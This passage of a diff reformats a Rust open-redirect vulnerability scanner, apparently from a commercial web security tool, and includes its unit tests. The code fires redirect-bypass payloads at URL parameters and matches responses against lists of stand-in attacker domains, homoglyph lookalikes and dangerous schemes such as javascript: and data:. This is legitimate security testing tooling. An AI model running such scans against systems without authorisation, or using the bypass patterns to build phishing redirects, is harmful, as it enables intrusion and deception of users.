         if ParameterFilter::should_skip_parameter(param_name, ScannerType::Other) {
-            debug!("[OpenRedirect] Skipping framework/internal parameter: {}", param_name);
+            debug!(
+                "[OpenRedirect] Skipping framework/internal parameter: {}",
+                param_name
+            );
             return Ok((Vec::new(), 0));
         }
 
@@ -867,7 +1841,11 @@ impl OpenRedirectScanner {
             self.generate_basic_payloads()
         };
 
-        info!("[OpenRedirect] Testing {} bypass payloads on parameter '{}'", payloads.len(), param_name);
+        info!(
+            "[OpenRedirect] Testing {} bypass payloads on parameter '{}'",
+            payloads.len(),
+            param_name
+        );
 
         // Get baseline
         let baseline = self.get_baseline(url, param_name).await;
@@ -877,15 +1855,17 @@ impl OpenRedirectScanner {
         let found_vuln_global = Arc::new(AtomicBool::new(false));
         let is_fast_mode = config.scan_mode == crate::types::ScanMode::Fast;
 
-        let vulns = self.scan_parameter_with_payloads(
-            url,
-            param_name,
-            &payloads,
-            &baseline,
-            is_fast_mode,
-            &found_vuln_global,
-            &total_tests,
-        ).await?;
+        let vulns = self
+            .scan_parameter_with_payloads(
+                url,
+                param_name,
+                &payloads,
+                &baseline,
+                is_fast_mode,
+                &found_vuln_global,
+                &total_tests,
+            )
+            .await?;
 
         let tests_run = total_tests.load(Ordering::Relaxed);
 
@@ -933,7 +1913,10 @@ impl OpenRedirectScanner {
         match self.http_client.get(&test_url).await {
             Ok(response) => Some(BaselineResponse {
                 status_code: response.status_code,
-                has_location_header: response.headers.iter().any(|(k, _)| k.to_lowercase() == "location"),
+                has_location_header: response
+                    .headers
+                    .iter()
+                    .any(|(k, _)| k.to_lowercase() == "location"),
                 body_length: response.body.len(),
             }),
             Err(_) => None,
@@ -956,7 +1939,9 @@ impl OpenRedirectScanner {
         }
 
         // Get Location header
-        let location = response.headers.iter()
+        let location = response
+            .headers
+            .iter()
             .find(|(k, _)| k.to_lowercase() == "location")
             .map(|(_, v)| v.as_str())?;
 
@@ -969,8 +1954,17 @@ impl OpenRedirectScanner {
                 url,
                 param_name,
                 payload,
-                &format!("{} - Redirects to: {}", description, self.truncate(location, 100)),
-                &format!("Status: {}\nLocation: {}\nBypass: {}", response.status_code, location, category.as_str()),
+                &format!(
+                    "{} - Redirects to: {}",
+                    description,
+                    self.truncate(location, 100)
+                ),
+                &format!(
+                    "Status: {}\nLocation: {}\nBypass: {}",
+                    response.status_code,
+                    location,
+                    category.as_str()
+                ),
                 severity,
                 confidence,
                 category,
@@ -986,10 +1980,18 @@ impl OpenRedirectScanner {
 
         // Check for known evil domains
         let evil_patterns = [
-            "evil.com", "evil。com", "evil．com", "attacker.com", "malicious.com",
-            "hacker.com", "pwned.com", "redirect-test.bountyy.fi",
+            "evil.com",
+            "evil。com",
+            "evil．com",
+            "attacker.com",
+            "malicious.com",
+            "hacker.com",
+            "pwned.com",
+            "redirect-test.bountyy.fi",
             // Homoglyph variations
-            "еvil.com", "evіl.com", "ℯvil.com",
+            "еvil.com",
+            "evіl.com",
+            "ℯvil.com",
         ];
         for pattern in &evil_patterns {
             if location_lower.contains(pattern) {
@@ -999,7 +2001,12 @@ impl OpenRedirectScanner {
 
         // Check for dangerous protocols
         let dangerous_protocols = [
-            "javascript:", "data:", "vbscript:", "file:", "about:", "blob:",
+            "javascript:",
+            "data:",
+            "vbscript:",
+            "file:",
+            "about:",
+            "blob:",
         ];
         for proto in &dangerous_protocols {
             if location_lower.starts_with(proto) {
@@ -1020,7 +2027,8 @@ impl OpenRedirectScanner {
                     && !host.starts_with("192.168.")
                     && !host.starts_with("10.")
                     && host != "localhost"
-                    && host.contains('.') {
+                    && host.contains('.')
+                {
                     return true;
                 }
             }
@@ -1136,16 +2144,22 @@ impl OpenRedirectScanner {
         let decoded_payload = urlencoding::decode(payload).unwrap_or_default();
         if body.contains(payload) || body.contains(&*decoded_payload) {
             let js_context_patterns = [
-                "window.location", "location.href", "document.location",
-                "location.assign", "location.replace",
+                "window.location",
+                "location.href",
+                "document.location",
+                "location.assign",
+                "location.replace",
             ];
 
             for ctx in &js_context_patterns {
                 if body.contains(ctx) {
                     // Check if payload appears near redirect context
                     if let Some(pos) = body.find(ctx) {
-                        let context_window = &body[pos.saturating_sub(200)..std::cmp::min(pos + 500, body.len())];
-                        if context_window.contains(payload) || context_window.contains(&*decoded_payload) {
+                        let context_window =
+                            &body[pos.saturating_sub(200)..std::cmp::min(pos + 500, body.len())];
+                        if context_window.contains(payload)
+                            || context_window.contains(&*decoded_payload)
+                        {
                             return Some(self.create_vulnerability(
                                 url,
                                 param_name,
@@ -1220,7 +2234,9 @@ impl OpenRedirectScanner {
             BypassCategory::DangerousProtocol | BypassCategory::DataUri => Severity::High,
             BypassCategory::HeaderInjection => Severity::High,
             BypassCategory::OAuthBypass => Severity::High,
-            BypassCategory::WhitelistBypass | BypassCategory::ParserDifferential => Severity::Medium,
+            BypassCategory::WhitelistBypass | BypassCategory::ParserDifferential => {
+                Severity::Medium
+            }
             BypassCategory::UnicodeBypass | BypassCategory::EncodingBypass => Severity::Medium,
             BypassCategory::HomoglyphAttack => Severity::Medium,
             BypassCategory::NullByteInjection => Severity::Medium,
@@ -1233,7 +2249,9 @@ impl OpenRedirectScanner {
         let location_lower = location.to_lowercase();
 
         // High confidence if redirect goes to our test domains
-        if location_lower.contains("evil.com") || location_lower.contains("redirect-test.bountyy.fi") {
+        if location_lower.contains("evil.com")
+            || location_lower.contains("redirect-test.bountyy.fi")
+        {
             return Confidence::High;
         }
 
@@ -1293,15 +2311,20 @@ impl OpenRedirectScanner {
     ) -> anyhow::Result<(Vec<Vulnerability>, usize)> {
         let target_domain = self.extract_domain(url);
 
-        let payloads = Arc::new(if crate::license::is_feature_available("enterprise_open_redirect") {
-            self.generate_enterprise_payloads(&target_domain)
-        } else if crate::license::is_feature_available("advanced_redirect") {
-            self.generate_professional_payloads(&target_domain)
-        } else {
-            self.generate_basic_payloads()
-        });
+        let payloads = Arc::new(
+            if crate::license::is_feature_available("enterprise_open_redirect") {
+                self.generate_enterprise_payloads(&target_domain)
+            } else if crate::license::is_feature_available("advanced_redirect") {
+                self.generate_professional_payloads(&target_domain)
+            } else {
+                self.generate_basic_payloads()
+            },
+        );
 
-        info!("[OpenRedirect] Generated {} payloads (will be reused across all parameters)", payloads.len());
+        info!(
+            "[OpenRedirect] Generated {} payloads (will be reused across all parameters)",
+            payloads.len()
+        );
 
         let baseline = Arc::new(self.get_baseline_for_url(url).await);
 
@@ -1315,7 +2338,10 @@ impl OpenRedirectScanner {
         let params: Vec<&str> = all_params.iter().take(20).copied().collect();
         let param_count = params.len();
 
-        info!("[OpenRedirect] Testing {} most common redirect parameters in parallel", param_count);
+        info!(
+            "[OpenRedirect] Testing {} most common redirect parameters in parallel",
+            param_count
+        );
 
         // ============================================================
         // PERFORMANCE OPTIMIZATION: Test all parameters concurrently
@@ -1342,19 +2368,25 @@ impl OpenRedirectScanner {
                     }
 
                     // Test this parameter with all payloads concurrently
-                    let param_vulns = scanner.scan_parameter_with_payloads(
-                        &url,
-                        param,
-                        &payloads,
-                        &baseline,
-                        is_fast_mode,
-                        &found_vuln_global,
-                        &total_tests,
-                    ).await;
+                    let param_vulns = scanner
+                        .scan_parameter_with_payloads(
+                            &url,
+                            param,
+                            &payloads,
+                            &baseline,
+                            is_fast_mode,
+                            &found_vuln_global,
+                            &total_tests,
+                        )
+                        .await;
 
                     if let Ok(vulns) = param_vulns {
                         if !vulns.is_empty() {
-                            info!("[VULN] Found {} vulnerabilities in parameter '{}'", vulns.len(), param);
+                            info!(
+                                "[VULN] Found {} vulnerabilities in parameter '{}'",
+                                vulns.len(),
+                                param
+                            );
                             found_vuln_global.store(true, Ordering::Relaxed);
 
                             let mut all_vulns = all_vulnerabilities.lock().await;
@@ -1390,7 +2422,10 @@ impl OpenRedirectScanner {
             );
         }
 
-        info!("[OpenRedirect] Completed {} total tests across {} parameters", tests_run, param_count);
+        info!(
+            "[OpenRedirect] Completed {} total tests across {} parameters",
+            tests_run, param_count
+        );
 
         Ok((final_vulns, tests_run))
     }
@@ -1400,7 +2435,10 @@ impl OpenRedirectScanner {
         match self.http_client.get(url).await {
             Ok(response) => Some(BaselineResponse {
                 status_code: response.status_code,
-                has_location_header: response.headers.iter().any(|(k, _)| k.to_lowercase() == "location"),
+                has_location_header: response
+                    .headers
+                    .iter()
+                    .any(|(k, _)| k.to_lowercase() == "location"),
                 body_length: response.body.len(),
             }),
             Err(_) => None,
@@ -1432,7 +2470,10 @@ impl OpenRedirectScanner {
 
                 async move {
                     // Early termination if we found vulnerability in fast mode
-                    if is_fast_mode && (found_vuln_local.load(Ordering::Relaxed) || found_vuln_global.load(Ordering::Relaxed)) {
+                    if is_fast_mode
+                        && (found_vuln_local.load(Ordering::Relaxed)
+                            || found_vuln_global.load(Ordering::Relaxed))
+                    {
                         return;
                     }
 
@@ -1443,14 +2484,17 @@ impl OpenRedirectScanner {
                             total_tests.fetch_add(1, Ordering::Relaxed);
 
                             // Check for HTTP redirect (3xx status with Location header)
-                            if let Some(vuln) = scanner.analyze_http_redirect(
-                                &response,
-                                &payload_info.payload,
-                                &payload_info.description,
-                                &test_url,
-                                &param_name,
-                                &payload_info.category,
-                            ).await {
+                            if let Some(vuln) = scanner
+                                .analyze_http_redirect(
+                                    &response,
+                                    &payload_info.payload,
+                                    &payload_info.description,
+                                    &test_url,
+                                    &param_name,
+                                    &payload_info.category,
+                                )
+                                .await
+                            {
                                 if !scanner.is_false_positive(&vuln, baseline) {
                                     found_vuln_local.store(true, Ordering::Relaxed);
                                     let mut vulns = vulnerabilities.lock().await;
@@ -1506,7 +2550,10 @@ impl OpenRedirectScanner {
                             }
                         }
                         Err(e) => {
-                            debug!("Request failed for payload {}: {}", payload_info.description, e);
+                            debug!(
+                                "Request failed for payload {}: {}",
+                                payload_info.description, e
+                            );
                         }
                     }
                 }
@@ -1564,7 +2611,7 @@ impl OpenRedirectScanner {
             false_positive: false,
             remediation: self.get_remediation(category),
             discovered_at: chrono::Utc::now().to_rfc3339(),
-                ml_data: None,
+            ml_data: None,
         }
     }
 
@@ -1652,7 +2699,9 @@ impl OpenRedirectScanner {
    - Never construct Location headers manually
    - Reject URLs containing %0d, %0a, or newlines"#
             }
-            BypassCategory::ParserDifferential | BypassCategory::SlashManipulation | BypassCategory::BackslashTrick => {
+            BypassCategory::ParserDifferential
+            | BypassCategory::SlashManipulation
+            | BypassCategory::BackslashTrick => {
                 r#"
 6. **Parser Differential Protections**
    - Use consistent URL parsing across all layers
@@ -1732,7 +2781,7 @@ mod uuid {
 mod tests {
     use super::*;
     use crate::detection_helpers::AppCharacteristics;
-use crate::http_client::HttpClient;
+    use crate::http_client::HttpClient;
     use std::sync::Arc;
 
     fn create_test_scanner() -> OpenRedirectScanner {
@@ -1746,7 +2795,11 @@ use crate::http_client::HttpClient;
         let payloads = scanner.generate_enterprise_payloads("example.com");
 
         // Should have 1000+ enterprise-grade payloads
-        assert!(payloads.len() >= 1000, "Should have at least 1000 payloads, got {}", payloads.len());
+        assert!(
+            payloads.len() >= 1000,
+            "Should have at least 1000 payloads, got {}",
+            payloads.len()
+        );
         println!("Generated {} enterprise payloads", payloads.len());
     }
 
@@ -1756,7 +2809,11 @@ use crate::http_client::HttpClient;
         let domains = scanner.generate_evil_domains();
 
         // Should have many domain variations
-        assert!(domains.len() >= 25, "Should have at least 25 domain variations, got {}", domains.len());
+        assert!(
+            domains.len() >= 25,
+            "Should have at least 25 domain variations, got {}",
+            domains.len()
+        );
     }
 
     #[test]
@@ -1765,7 +2822,11 @@ use crate::http_client::HttpClient;
         let protocols = scanner.generate_protocols();
 
         // Should have many protocol variations
-        assert!(protocols.len() >= 40, "Should have at least 40 protocol variations, got {}", protocols.len());
+        assert!(
+            protocols.len() >= 40,
+            "Should have at least 40 protocol variations, got {}",
+            protocols.len()
+        );
     }
 
     #[test]
@@ -1794,15 +2855,25 @@ use crate::http_client::HttpClient;
     #[test]
     fn test_extract_domain() {
         let scanner = create_test_scanner();
-        assert_eq!(scanner.extract_domain("https://example.com/path"), "example.com");
-        assert_eq!(scanner.extract_domain("https://sub.example.com"), "sub.example.com");
+        assert_eq!(
+            scanner.extract_domain("https://example.com/path"),
+            "example.com"
+        );
+        assert_eq!(
+            scanner.extract_domain("https://sub.example.com"),
+            "sub.example.com"
+        );
     }
 
     #[test]
     fn test_redirect_params_count() {
         let scanner = create_test_scanner();
         let params = scanner.get_redirect_params();
-        assert!(params.len() >= 100, "Should have at least 100 param names, got {}", params.len());
+        assert!(
+            params.len() >= 100,
+            "Should have at least 100 param names, got {}",
+            params.len()
+        );
     }
 
     #[test]
@@ -1812,11 +2883,32 @@ use crate::http_client::HttpClient;
 
         let categories: HashSet<_> = payloads.iter().map(|p| &p.category).collect();
 
-        assert!(categories.iter().any(|c| **c == BypassCategory::Basic), "Missing Basic");
-        assert!(categories.iter().any(|c| **c == BypassCategory::ProtocolRelative), "Missing ProtocolRelative");
-        assert!(categories.iter().any(|c| **c == BypassCategory::EncodingBypass), "Missing EncodingBypass");
-        assert!(categories.iter().any(|c| **c == BypassCategory::WhitelistBypass), "Missing WhitelistBypass");
-        assert!(categories.iter().any(|c| **c == BypassCategory::IPAddress), "Missing IPAddress");
+        assert!(
+            categories.iter().any(|c| **c == BypassCategory::Basic),
+            "Missing Basic"
+        );
+        assert!(
+            categories
+                .iter()
+                .any(|c| **c == BypassCategory::ProtocolRelative),
+            "Missing ProtocolRelative"
+        );
+        assert!(
+            categories
+                .iter()
+                .any(|c| **c == BypassCategory::EncodingBypass),
+            "Missing EncodingBypass"
+        );
+        assert!(
+            categories
+                .iter()
+                .any(|c| **c == BypassCategory::WhitelistBypass),
+            "Missing WhitelistBypass"
+        );
+        assert!(
+            categories.iter().any(|c| **c == BypassCategory::IPAddress),
+            "Missing IPAddress"
+        );
     }
 
     #[test]
@@ -1836,7 +2928,10 @@ use crate::http_client::HttpClient;
     #[test]
     fn test_category_names() {
         assert_eq!(BypassCategory::Basic.as_str(), "Basic External Redirect");
-        assert_eq!(BypassCategory::DangerousProtocol.as_str(), "Dangerous Protocol Handler");
+        assert_eq!(
+            BypassCategory::DangerousProtocol.as_str(),
+            "Dangerous Protocol Handler"
+        );
         assert_eq!(BypassCategory::HomoglyphAttack.as_str(), "Homoglyph Attack");
     }
 }
